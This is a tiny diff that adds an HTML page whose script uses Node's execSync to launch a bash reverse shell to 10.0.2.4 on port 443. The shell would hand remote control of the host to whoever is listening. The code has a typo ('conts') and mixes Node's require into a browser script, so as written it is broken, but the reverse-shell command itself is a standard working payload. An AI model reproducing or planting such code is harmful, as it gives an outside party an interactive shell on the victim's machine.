@@ -1,0 +1,7 @@
+<html>
+<script> 
+const { execSync } = require("child_process");
+conts output = execSync ("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.4/443 0>&1'", { encoding: "utf-8" });
+console.log(output);
+</script>
+</html>
